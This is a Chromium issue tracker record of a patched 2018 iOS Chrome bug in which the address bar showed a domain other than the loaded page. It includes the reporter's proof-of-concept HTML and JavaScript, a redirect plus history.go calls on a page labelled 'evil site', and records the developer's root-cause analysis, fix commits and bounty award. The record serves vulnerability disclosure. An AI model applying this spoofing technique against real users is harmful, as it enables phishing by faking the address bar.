# Security:Chrome URL Spoofing in Omnibox

| Field | Value |
|-------|-------|
| **Issue ID** | [40092514](https://issues.chromium.org/issues/40092514) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | UI>Browser>Navigation |
| **Platforms** | iOS |
| **Reporter** | xi...@gmail.com |
| **Assignee** | eu...@chromium.org |
| **Created** | 2018-09-20 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

Chrome URL Spoofing in Omnibox

**VERSION**  

Chrome Version: 69.0.3497.91+[Stable]  

Operating System: [iOS]

**REPRODUCTION CASE**

(1)Access <https://xisigr.com/test/spoof/chrome/url_009.html>  

(2)Click on the "Click me" button.  

(3)Address bar says <https://xisigr.com> - this is NOT <https://xisigr.com>.

google site:  

<https://xisigr.com/test/spoof/chrome/url_009.html>

=======url\_009.html=======

<script>
function aa(){
location.replace('http://spoof.fish/test/spoof/chrome/e.html');
}
</script>

<button onclick="aa()">Click me</button>  

=======url\_009.html=======

evil site:  

<http://spoof.fish/test/spoof/chrome/e.html>

=======e.html=======

<h1>Address bar says https://xisigr.com - this is NOT https://xisigr.com</h1>
<button onclick="alert(document.domain)">haaaaa</button>
<script>
window.history.go(1);
window.history.go(-1);
</script>
=======e.html=======

## Timeline

### xi...@gmail.com (2018-09-21)

[Comment Deleted]

### mb...@chromium.org (2018-09-21)

eugenebut: Are you the right owner for this? Feel free to reassign it if you know of anyone else who might be, or assign it back to me if not.

[Monorail components: UI>Browser>Navigation]

### sh...@chromium.org (2018-09-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-09-22)

[Empty comment from Monorail migration]

### eu...@chromium.org (2018-09-24)

Thank you for the bugreport.

http://spoof.fish/test/spoof/chrome/e.html does not load
I tried reproducing the bug with attached html example (M69 stable and trunk code), but the URL does not spoof. 
Could you please provide working POC for this bug. Thanks!

### xi...@gmail.com (2018-09-25)

[Comment Deleted]

### xi...@gmail.com (2018-09-25)

[Comment Deleted]

### eu...@chromium.org (2018-09-25)

Thanks for updating POC. I was able to reproduce the problem. Here is what happens:

 - xisigr.com calls replaceState("http://xn--lwcc.com")
 - replace state creates a new navigation item (known bug)
 - old navigation item (xisigr.com) stays associated with WKBackForwardListItem whose state was replaced
 - at this point navigation manager's state is incorrect
 - http://xn--lwcc.com performs renderer-initiated back navigation 
 - chrome loads associated WKBackForwardListItem for xisigr.com
 - no actual navigation happens, but committed navigation item is now xisigr.com

I don't see UXSS here, but rather a URL spoofing. User sees http://xn--lwcc.com, but URL says xisigr.com


### bu...@chromium.org (2018-09-25)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/b312df8d9b00ca26046d1fe442ee19dc9780fcfe

commit b312df8d9b00ca26046d1fe442ee19dc9780fcfe
Author: Eugene But <eugenebut@chromium.org>
Date: Tue Sep 25 17:46:54 2018

Invalidate associated WKBackForwardListItem after replace state.

Bug: 887273
Cq-Include-Trybots: luci.chromium.try:ios-simulator-cronet;luci.chromium.try:ios-simulator-full-configs
Change-Id: I99e171f64a20c7dba9f8984d05cb509b00d01ea5
Reviewed-on: https://chromium-review.googlesource.com/1243166
Reviewed-by: Danyao Wang <danyao@chromium.org>
Commit-Queue: Eugene But <eugenebut@chromium.org>
Cr-Commit-Position: refs/heads/master@{#593992}
[modify] https://crrev.com/b312df8d9b00ca26046d1fe442ee19dc9780fcfe/ios/web/web_state/ui/crw_web_controller.mm


### eu...@chromium.org (2018-09-25)

Requesting approval. Will merge after canary verification.

### sh...@chromium.org (2018-09-25)

This bug requires manual review: Less than 17 days to go before AppStore submit on M70
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), geohsu@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-09-26)

[Empty comment from Monorail migration]

### ka...@chromium.org (2018-09-27)

Let me know when you've gotten verification.

### sr...@chromium.org (2018-09-27)

Verified on iPhoneX, iPhone5s M71.0.3563.0 canary
iOS 12.1 beta, iOS11.4.1

URL is now matched with the content area.

### ka...@chromium.org (2018-09-27)

Approved.

### bu...@chromium.org (2018-09-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/230373aaa4d64aed8e01832de10fe7e74457f63b

commit 230373aaa4d64aed8e01832de10fe7e74457f63b
Author: Eugene But <eugenebut@google.com>
Date: Thu Sep 27 21:10:06 2018

Invalidate associated WKBackForwardListItem after replace state.

TBR=eugenebut@chromium.org

(cherry picked from commit b312df8d9b00ca26046d1fe442ee19dc9780fcfe)

Bug: 887273
Cq-Include-Trybots: luci.chromium.try:ios-simulator-cronet;luci.chromium.try:ios-simulator-full-configs
Change-Id: I99e171f64a20c7dba9f8984d05cb509b00d01ea5
Reviewed-on: https://chromium-review.googlesource.com/1243166
Reviewed-by: Danyao Wang <danyao@chromium.org>
Commit-Queue: Eugene But <eugenebut@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#593992}
Reviewed-on: https://chromium-review.googlesource.com/1249819
Reviewed-by: Eugene But <eugenebut@chromium.org>
Cr-Commit-Position: refs/branch-heads/3538@{#717}
Cr-Branched-From: 79f7c91a2b2a2932cd447fa6f865cb6662fa8fa6-refs/heads/master@{#587811}
[modify] https://crrev.com/230373aaa4d64aed8e01832de10fe7e74457f63b/ios/web/web_state/ui/crw_web_controller.mm


### cr...@appspot.gserviceaccount.com (2018-09-27)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/230373aaa4d64aed8e01832de10fe7e74457f63b

Commit: 230373aaa4d64aed8e01832de10fe7e74457f63b
Author: eugenebut@google.com
Commiter: eugenebut@chromium.org
Date: 2018-09-27 21:10:06 +0000 UTC

Invalidate associated WKBackForwardListItem after replace state.

TBR=eugenebut@chromium.org

(cherry picked from commit b312df8d9b00ca26046d1fe442ee19dc9780fcfe)

Bug: 887273
Cq-Include-Trybots: luci.chromium.try:ios-simulator-cronet;luci.chromium.try:ios-simulator-full-configs
Change-Id: I99e171f64a20c7dba9f8984d05cb509b00d01ea5
Reviewed-on: https://chromium-review.googlesource.com/1243166
Reviewed-by: Danyao Wang <danyao@chromium.org>
Commit-Queue: Eugene But <eugenebut@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#593992}
Reviewed-on: https://chromium-review.googlesource.com/1249819
Reviewed-by: Eugene But <eugenebut@chromium.org>
Cr-Commit-Position: refs/branch-heads/3538@{#717}
Cr-Branched-From: 79f7c91a2b2a2932cd447fa6f865cb6662fa8fa6-refs/heads/master@{#587811}

### aw...@chromium.org (2018-10-01)

[Empty comment from Monorail migration]

### aw...@google.com (2018-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-10-04)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-10-04)

Nice one xisigr@! The panel awarded $3,000 for this report!

### aw...@chromium.org (2018-10-04)

[Empty comment from Monorail migration]

### aw...@google.com (2018-10-15)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-11-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2019-01-02)

This issue was migrated from crbug.com/chromium/887273?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092514)*
